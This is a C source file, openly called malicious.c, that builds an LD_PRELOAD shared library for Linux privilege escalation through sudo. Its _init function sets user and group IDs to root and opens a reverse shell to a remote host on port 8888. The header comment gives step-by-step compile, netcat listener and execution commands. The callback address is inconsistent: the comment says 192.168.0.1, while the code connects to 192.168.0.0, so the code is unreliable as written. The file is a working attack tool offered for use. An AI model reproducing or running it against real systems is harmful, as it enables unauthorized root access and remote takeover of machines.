/*
 * Purpose: This code is designed for Linux privilege escalation using LD_PRELOAD.
 * It creates a shared library that, when loaded via sudo, escalates privileges to root
 * and establishes a reverse shell to a specified IP (192.168.0.1) and port (8888).
 * The library is intended to be used in a scenario where sudo preserves the LD_PRELOAD
 * environment variable (e.g., with !env_reset in sudoers). When a command like
 * "sudo /usr/bin/ping" is executed with LD_PRELOAD set to this library, it connects
 * back to the attacker's machine, providing a root shell over the network.
 *
 * Usage: Copy and sSave this file as malicious.c
 * 1. Compile: gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles
 * 2. Set up listener: nc -lvp 8888 on 192.168.0.1
 * 3. Run: sudo LD_PRELOAD=./malicious.so /usr/bin/ping
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>  // For setuid/setgid
#include <unistd.h>     // For setuid/setgid, unsetenv, and execve
#include <netinet/in.h> // For socket structures
#include <arpa/inet.h>  // For inet_addr

void _init() {
    unsetenv("LD_PRELOAD"); // Prevent infinite loop by clearing LD_PRELOAD
    
    // Escalate privileges to root
    setgid(0); // Set group ID to root
    setuid(0); // Set user ID to root
    
    // Set up socket for reverse shell
    int sock;
    struct sockaddr_in server;
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    
    // Configure server address (192.168.0.0:8888)
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("192.168.0.0"); // Target IP
    server.sin_port = htons(8888);                     // Target port
    
    // Connect to the remote host
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    
    // Redirect stdin, stdout, stderr to the socket
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr
    
    // Execute a shell, inheriting the socket connection
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}
